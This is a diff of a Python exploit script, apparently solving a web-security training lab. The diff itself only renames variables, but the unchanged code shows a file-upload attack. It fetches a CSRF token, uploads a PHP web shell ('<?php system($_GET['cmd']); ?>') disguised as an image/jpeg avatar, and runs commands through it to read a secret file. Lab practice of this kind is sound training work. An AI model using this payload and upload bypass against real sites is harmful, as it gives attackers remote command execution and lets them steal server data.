@@ -26,8 +26,8 @@ def login():
 
 def upload_file():
     my_account_url = f"{lab_url}/my-account"
-    res = requests.get(my_account_url, cookies={"session": cookie})
-    csrf_token = extract_csrf_token(res)
+    response_one = requests.get(my_account_url, cookies={"session": cookie})
+    csrf_token = extract_csrf_token(response_one)
 
     file = {
         "avatar": ("webshell.php", "<?php system($_GET['cmd']); ?>", "image/jpeg"),
@@ -39,8 +39,8 @@ def upload_file():
     }
 
     upload_url = f"{lab_url}/my-account/avatar"
-    response = requests.post(upload_url, cookies={"session": cookie}, files=file, data=data)
-    return response
+    response_two = requests.post(upload_url, cookies={"session": cookie}, files=file, data=data)
+    return response_two
 
 
 def execute_command():
@@ -54,7 +54,7 @@ if __name__ == "__main__":
         cookie = login()
         print("Uploading file webshell.php")
         upload_file()
-        print(f"File has been uploaded to this location: {lab_url}/files/avatars/webshell.php")
+        print(f"File has been uploaded here: {lab_url}/files/avatars/webshell.php")
         print("The contents of the /home/carlos/secret file: ", end='')
         execute_command()
 
